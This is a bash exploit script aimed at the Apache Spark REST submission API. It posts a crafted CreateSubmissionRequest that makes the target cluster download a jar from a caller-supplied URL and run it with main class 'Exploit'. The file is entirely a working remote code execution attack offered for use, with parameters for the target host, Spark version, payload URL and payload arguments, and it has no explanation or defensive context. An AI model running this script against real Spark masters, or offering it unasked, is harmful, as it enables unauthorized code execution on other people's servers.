#!/bin/bash

target=$1
version=$2
jar_url=$3
jar_args=$4

curl -X POST http://${target}/v1/submissions/create \
--header "Content-Type:application/json;charset=UTF-8" \
--data @<(cat <<EOF
{
  "action": "CreateSubmissionRequest",
  "clientSparkVersion": "${version}",
  "appArgs": [
    "${jar_args}"
  ],
  "appResource": "${jar_url}",
  "environmentVariables": {
    "SPARK_ENV_LOADED": "1"
  },
  "mainClass": "Exploit",
  "sparkProperties": {
    "spark.jars": "${jar_url}",
    "spark.driver.supervise": "false",
    "spark.app.name": "Exploit",
    "spark.eventLog.enabled": "true",
    "spark.submit.deployMode": "cluster",
    "spark.master": "spark://${target}"
  }
}
EOF
)
